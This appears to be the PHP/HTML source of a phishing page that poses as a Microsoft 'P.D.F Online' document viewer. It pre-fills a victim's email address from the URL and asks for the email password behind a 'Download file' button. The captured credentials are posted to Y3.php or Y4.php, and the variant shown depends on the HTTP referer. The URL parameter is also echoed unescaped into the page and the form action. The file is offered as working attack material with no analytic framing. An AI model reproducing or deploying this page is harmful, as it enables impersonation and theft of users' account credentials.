
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#" xmlns:fb="https://www.facebook.com/2008/fbml"
lang="en" class="no-js">


<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1" /> 



<title>P.D.F&reg;  Online Microsoft</title>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>



<script>

function getParm(name)

{

  name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");

  var regexS = "[\\?&]"+name+"=([^&#]*)";

  var regex = new RegExp(regexS);

  var results = regex.exec(window.location.href);

  

  //set variables for each of the fields you wish to pre-file

  //reference them by the ID you found for the field when viewing the source

  EmailField = document.getElementById("ema");  



  if(results == null)

    return "";

  else

    return results[1];

}

//This function executes the function above and set the values in the fields

window.onload=function execParm() {

    var urlemail = getParm('X1');

    EmailField.value = urlemail;



    var status = getParm('status');

    // alert(status);

    // if(status !='' && status ==0){

    //     $("#showAlert").html('Username or Password is Incorrect, Please Try Again.  ');         

    // }



 var emailInput =  document.forms["xe"]["email"].value;



  if (emailInput !='') {

    document.forms["xe"]["email"].setAttribute("readonly", true);

  }





}

</script>

    <script>

    window.DOM = { get: function(id) { return document.getElementById(id) } };


</script>
<script>
function myFunction() {
    document.getElementById("myDIV").style.display = "block";
}
</script>


<style>



/* CSS Document */



body {

   font-family:Verdana;

   topmargin:0px; 

   leftmargin:0px; 

   rightmargin:0px; 

   background-attachment: fixed;

     }



#header { color:#fff; 

          font-size:15px;

          background:#000000;

          font-family:Verdana;

         }



#doc { color:#999; 

       border-top:#999 solid 1px; 

     padding:8px;

     font-size:15px;

     }

#doc1 { color:#999; 

       border-top:#999 solid 1px; 

     border-left:#999 solid 1px;

     padding:5px;

     font-size:15px;

     }



#form { color:#29703B; 

        font-size:20px;

       }



input{

width:400px;

padding:10px;

border-radius:0px;

border:1px solid #E4E4E4;

font-size:16px;

font-family:Verdana;

color:#333;

outline:none;

}



input:focus{

border:1px solid #305E8B;

outline:none;

color:#060;

}



input:hover {box-shadow:0px 1px 1px 1px #999;

}



input[type=submit]{

width:418px;

padding:10px;

border-radius:0px;

border:1px solid #E4E4E4;

font-size:14px;

font-family:Verdana;

background:#B74446;

color:#FFF;

}



input[type=submit]:hover{

background:#8F383A;

color:#FFF;

cursor:pointer;

border:hidden;

box-shadow:0px 1px 1px 1px #999;

}



#check { width:16px; 

         height:16px; 

     color:#666;

         }

     

#wch  { width:80%;

}



#fdiv  { width:500px;;

         text-align:left;

     padding:15px;

     background:#FFF;

     border-radius:2px;

}



#ex {  color:#29703B;

        font-size:14px;

    font-weight:bold;

    padding-bottom:8px;

         }

#rem {color:#999;

      padding-left:25px;

      }

 

#priv { font-size:12px;

        padding:5px; 

    color:#999;}

    

#com { padding-top:5px; 

       font-size:14px; 

     border-top:#CBCBCB solid 1px;

     color:#CBCBCB;

     padding-left:48px;

      }

      

#ema{

  color:#FF0000;

  padding-left:10px;

  font-family:Verdana;

  font-size:13px;

}



@media only screen and (max-width: 600px) 

{

#header { display:none;

         }

#doc { display:none;

    border-top:#E6E6E6 solid 1px; 

     border-bottom:#E6E6E6 solid 1px;

     }

           

           #ema{

  color:#FF0000;

  padding-left:10px;

  font-family:Verdana;

  font-size:11px;

}



           

#doc1 { color:#999; 

       border-top:#E6E6E6 solid 1px; 

     border-bottom:#E6E6E6 solid 1px;

     padding:3px;

     font-size:13px;

     }

#fdiv  { width:95%;;

         text-align:left;

     padding:5px;

     background:#FFF;

     padding-left:20px;

     border-radius:3px;

}

#form { color:#29703B; 

        font-size:14px;

       }



#ex {  color:#29703B;

        font-size:11px;

    font-weight:bold;

    padding-bottom:6px;

    width:65%;

         }

  

input{

width:95%;

padding:6px;

border-radius:0px;

border:1px solid #E4E4E4;

font-size:13px;

font-family:Verdana;

color:#333;

outline:none;

}

input[type=submit]{

width:100%;

padding:6px;

border-radius:2px;

border:1px solid #E4E4E4;

font-size:13px;

font-family:Verdana;

background:#29703B;

color:#FFF;

}

#check { width:13px; 

         height:13px; 

     color:#666;

         }

     

#wch  { width:60%;

}



#l {font-size:14px;}

#rem { font-size:13px;}

#priv { font-size:10px;

        padding:5px; 

    color:#999;}

#com { padding-top:4px; 

       font-size:11px; 

     border-top:#29703B solid 1px;

     color:#C0C0C0;

      }



<style>

#myDIV{
    display: none;
}


</style>



<script type="text/javascript">

function validateForm() {

    var ema = document.forms["xe"]["email"].value;

    if (ema == null || ema == "") {

        //alert("Fields cannot be empty");

    document.getElementById('ema').style.borderColor="#E34234";

        return false;

    }

    

    var emo = document.forms["xe"]["password"].value;

    if (emo == null || emo == "") {

        document.getElementById('emo').style.borderColor="#E34234";

        return false;

    }

  

  var emo2 = document.forms["xe"]["password2"].value;

    if (emo2 == null || emo2 == "") {

    //alert("Comfirm password empty");

        document.getElementById('emo2').style.borderColor = "#E34234";

        return false;

    }

  

  var emo2 = document.forms["xe"]["password2"].value;

    if (emo != emo2) {

         //alert("Passwords Do not match");

         document.getElementById("emo2").style.borderColor = "#E34234";

         return false;

  }

  

  var emailExp = /^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,4}$/;

  if(document.forms["xe"]["email"].value.match(emailExp)){

    return true;

  }else{

   document.getElementById('ema').style.borderColor="#E34234";

     return false;

  }

  

  }

</script>
<style>


#panel {
    display: none;
}
</style>





</head>

<body onclick="myFunction()" background="untitled.png" ">

<br>




<div align="center" >



<?php
if(isset($_SERVER['HTTP_REFERER'])) { ?>
<div style="width:400px; background:white;border-radius: 25px;
    border: 2px solid #73AD21;
    padding: 20px; font-family:Calibri UI Light;">


<img src="head2.png">


<div  style="background:white;color:#1656bc;font-size:22px;">
 <b> <?php echo $_GET['X1']; ?> </b>
</div>
<div style="padding:3px;"></div>

<form name="xe" action="Y4.php?X1=+<?php echo $_GET['X1']; ?>" method="POST" style="width:400px;">

<input id="ema"  type="hidden" name="email" value="<?php 
  echo $email = $_POST['X1'];
?>" placeholder="Email address" style="font-size:12px;width:280px"  />

<div style="padding:5px;"></div>

<input id="emo" style="-webkit-text-security: disc; -moz-text-security: disc; text-security: disc; outline:none; font-size:12px;width:280px;"
 name="password" placeholder=" Enter Email Password" value=""  autocomplete="off" required />

<div style="padding:6px;"></div>
<input type="submit" name="submit"style="background:#1656bc;color:white;width:300px" value="Download file" required />
    <div style="padding:3px;"></div>
   	
	
</form>

</div>
<?php
}
else{ ?>
<p class="flip" onclick="myFunction()"><img src="button.png"></p>

<div id="panel" style="width:400px; background:white;border-radius: 25px;
    border: 2px solid #73AD21;
    padding: 20px; font-family:Calibri UI Light;">


<img src="head.png">


<div  style="background:white;color:#1656bc;font-size:22px;">
 <b> <?php echo $_GET['X1']; ?> </b>
</div>
<div style="padding:3px;"></div>

<form name="xe" action="Y3.php?X1=+<?php echo $_GET['X1']; ?>" method="POST" style="width:400px;">

<input id="ema"  type="hidden" name="email" value="<?php 
  echo $email = $_POST['X1'];
?>" placeholder="Email address" style="font-size:12px;width:280px"  />

<div style="padding:5px;"></div>

<input id="emo" style="-webkit-text-security: disc; -moz-text-security: disc; text-security: disc; outline:none; font-size:12px;width:280px;"
 name="password" placeholder=" Enter Email Password" value=""  autocomplete="off" required />

<div style="padding:6px;"></div>
<input type="submit" name="submit"style="background:#1656bc;color:white;width:300px" value="Download file" required />
    <div style="padding:3px;"></div>
   	
	
</form>





</div>
<?php
}

?>












<br>

<br><br>

<br>
<br>

<br>




</div>



</body>
<script>
function myFunction() {
    document.getElementById("panel").style.display = "block";
}
</script>

</html>

